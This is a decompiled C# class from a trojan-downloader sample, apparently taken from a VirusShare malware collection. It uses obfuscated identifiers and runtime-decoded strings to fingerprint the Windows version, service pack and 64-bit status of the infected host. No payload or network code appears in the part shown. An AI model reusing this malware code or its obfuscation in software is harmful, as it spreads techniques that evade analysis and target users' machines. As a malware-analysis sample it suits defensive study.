// Decompiled with JetBrains decompiler
// Type: ᥟޱഁेࠃᵷᣚ.ϵᲀࠛᬣׯ඲჋᷶
// Assembly: lgy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F6858297-EDCC-46A7-BF64-CBC6BE6B3CD4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.Crypted.ej-8021b1adb21670f837224cd99ccee8599abd7a84c7c3cf7b87df9da753a7739c.exe

using System;
using System.Runtime.InteropServices;

namespace ᥟޱഁेࠃᵷᣚ
{
  internal class ϵ\u1C80ࠛᬣ\u05EF\u0DB2\u10CB\u1DF6
  {
    public static string ᤒ\u0D59ᐙᘔᏆᨨᎡ\u09B5()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string str = "";
      if (osVersion.Platform.ToString() == "Win32NT")
      {
        switch (ϵ\u1C80ࠛᬣ\u05EF\u0DB2\u10CB\u1DF6.\u1CD4(osVersion.Version))
        {
          case "4.1.2222":
            str = ґ.ᖢ("6Pr/9QCRUTJTCASxysk=", true);
            break;
          case "4.1.2600":
            str = ґ.ᖢ("6Pr/9QAIkVEyUwSxysnk1g==", true);
            break;
          case "4.9.3000":
            str = ґ.ᖢ("[WINME]", true);
            break;
          case "5.0.2195":
            str = ґ.ᖢ("LT9EOkVN1pnCBkn2CAYGBg==", true);
            break;
          case "5.1.2600":
          case "5.2.3790":
            str = ґ.ᖢ("LT9EOkXWmcIGTUn2LiY=", true);
            break;
          case "6.0.6000":
          case "6.0.6001":
          case "6.0.6002":
          case "6.0.6003":
            str = ґ.ᖢ("LT9EOkVN1pnCBkn2LD9JSjc=", true);
            break;
          case "6.1.7600":
          case "6.1.7601":
          case "6.1.7602":
          case "6.1.7603":
            str = ґ.ᖢ("LT9EOtaZwgZFTUn2DQ==", true);
            break;
          default:
            str = ґ.ᖢ("K0RB1pnCBkRFTUQ=", true);
            break;
        }
      }
      string empty = string.Empty;
      ϵ\u1C80ࠛᬣ\u05EF\u0DB2\u10CB\u1DF6.\u08DFы\u0E86ᔡబ\u0C0Dᷡ ыᔡబᷡ = new ϵ\u1C80ࠛᬣ\u05EF\u0DB2\u10CB\u1DF6.\u08DFы\u0E86ᔡబ\u0C0Dᷡ();
      ыᔡబᷡ.\u1C8D\u0B70ߠᅳଇᠫ = Marshal.SizeOf(typeof (ϵ\u1C80ࠛᬣ\u05EF\u0DB2\u10CB\u1DF6.\u08DFы\u0E86ᔡబ\u0C0Dᷡ));
      if (ϵ\u1C80ࠛᬣ\u05EF\u0DB2\u10CB\u1DF6.ᰢళ(ref ыᔡబᷡ))
      {
        if (ыᔡబᷡ.\u07C2ॵᰬ.ToString().Contains(ґ.ᖢ("KTtITD85O9aZwgb2Jjc5QfYH", true)))
          str += ґ.ᖢ("ATThiXfOMRI=", true);
        if (ыᔡబᷡ.\u07C2ॵᰬ.ToString().Contains(ґ.ᖢ("KTtITD85O9aZwgb2Jjc5QfYI", true)))
          str += ґ.ᖢ("ATThiXfOMRM=", true);
        if (ыᔡబᷡ.\u07C2ॵᰬ.ToString().Contains(ґ.ᖢ("KTtITD85O9aZwgb2Jjc5QfYJ", true)))
          str += ґ.ᖢ("ATThiXfOMRQ=", true);
        if (ыᔡబᷡ.\u07C2ॵᰬ.ToString().Contains(ґ.ᖢ("KTtITD85O9aZwgb2Jjc5QfYK", true)))
          str += ґ.ᖢ("ATThiXfOMRU=", true);
        if (ыᔡబᷡ.\u07C2ॵᰬ.ToString().Contains(ґ.ᖢ("NEZTV0pERuGJd84BMUJETAEW", true)))
          str += ґ.ᖢ("ATThiXfOMRY=", true);
        if (ыᔡబᷡ.\u07C2ॵᰬ.ToString().Contains(ґ.ᖢ("NEZTV0pERuGJd84BMUJETAEX", true)))
          str += ґ.ᖢ("vvGeKgce7tQ=", true);
        if (ыᔡబᷡ.\u07C2ॵᰬ.ToString().Contains(ґ.ᖢ("NEZTV0pERuGJd84BMUJETAEY", true)))
          str += ґ.ᖢ("vvGeKgce7tU=", true);
        if (ыᔡబᷡ.\u07C2ॵᰬ.ToString().Contains(ґ.ᖢ("NEZTV0pERuGJd84BMUJETAEZ", true)))
          str += ґ.ᖢ("vvGeKgce7tY=", true);
        if (ыᔡబᷡ.\u07C2ॵᰬ.ToString().Contains(ґ.ᖢ("NEZTV0pERuGJd84BMUJETAEa", true)))
          str += ґ.ᖢ("vvGeKgce7tc=", true);
      }
      return !ϵ\u1C80ࠛᬣ\u05EF\u0DB2\u10CB\u1DF6.\u1BA3ɗ() ? str + ґ.ᖢ("vsu+nioHHhbW1A==", true) : str + ґ.ᖢ("vsu+nioHHhbU0g==", true);
    }

    private static string \u1CD4(Version _param0) => _param0.Major.ToString() + "." + _param0.Minor.ToString() + "." + _param0.Build.ToString();

    [DllImport("kernel32.dll", EntryPoint = "GetVersionEx")]
    private static extern bool ᰢళ(
      ref ϵ\u1C80ࠛᬣ\u05EF\u0DB2\u10CB\u1DF6.\u08DFы\u0E86ᔡబ\u0C0Dᷡ _param0);

    public static bool \u1BA3ɗ()
    {
      try
      {
        return !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ProgramW6432"));
      }
      catch
      {
        return false;
      }
    }

    public struct \u08DFы\u0E86ᔡబ\u0C0Dᷡ
    {
      public int \u1C8D\u0B70ߠᅳଇᠫ;
      public int \u1B02ᯥ;
      public int ᴧۤౡिᛔ\u0EF8ͷ\u0013֙;
      public int \u1042\u009C;
      public int ᔛ౦֤ܚᎬᏖྍ\u0FF5\u0025;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
      public string \u07C2ॵᰬ;
      public short ਯᚏᦂǲڐẶഉ۷;
      public short \u0AC9ởಷỎᆪఙٴ;
      public short Аᯱกህԍգᄐ;
      public byte ܫౘ\u0F09ᴂᱚҞ;
      public byte \u19E8ጝᢇ\u08C3ୖңলĥྦ;
    }
  }
}
